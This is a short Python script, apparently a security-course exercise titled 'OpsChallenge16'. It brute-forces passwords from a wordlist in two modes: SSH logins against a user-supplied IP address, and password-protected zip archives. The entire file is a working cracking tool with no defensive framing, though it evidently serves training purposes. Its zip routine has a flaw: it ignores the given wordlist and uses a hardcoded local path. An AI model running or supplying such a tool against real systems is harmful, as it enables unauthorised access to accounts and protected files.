#!/usr/bin/env python3
###########################
# Title: OpsChallenge16
# Author:Jeff Snyder
# Date: 26OCT2020
# Purpose: Dictionary attack against SSH connection
###########################
import smtplib
import itertools
import sys
import time
from pexpect import pxssh
import zipfile

def cracker(user, ipAddress, txtFile ):
    filepath =open(txtFile)
    for i in filepath.readlines():
        secret=i.strip("\n")
        print(secret)
        s=pxssh.pxssh()
        try:
            s.login(ipAddress, user, secret)
            print("The password is  "+ secret)
            break    
        except pxssh.ExceptionPxssh as e:
            print ("pxssh failed to login")
            print(e)
            time.sleep(1)

def zipCracker(zip_loc, txtFile):
    txtFile="/home/jeff/sample.txt"
    zip_file=zip_loc
    zip_file=zipfile.ZipFile(zip_file)
    filepath=open(txtFile)
    for i in filepath.readlines():
        secret=i.strip()
        print(secret)
        try:
            zip_file.extractall(pwd=bytes(secret,"utf-8"))
        except:
            continue    
        else:
            print("Password is "+ secret)
            exit(0)
            
    print("not found")

def main():
    print("Shall we play a game?")
    modes=input("Press 1 for bruteforce SSH, Press 2 for bruteforce zipfile     ")
    if modes == "1":
        print("You have selected to crack an SSH connection.")    
        user=input("What is the username for the SSH connection?")
        ipAddress=input("What is the ip address of the target system?")
        txtFile=input("What is the folder path to your dictionary file?")
        cracker(user, ipAddress, txtFile)  
    elif modes == "2":
        print("You have selected to crack a zipfile")
        zip_loc=input("Where is the zipfile located (include zipfile)?")
        txtFile=input("What is the folder path to your dictionary file?")
        zipCracker(zip_loc,txtFile)
    else:
        print("You get to rerun the code")
        main()
main()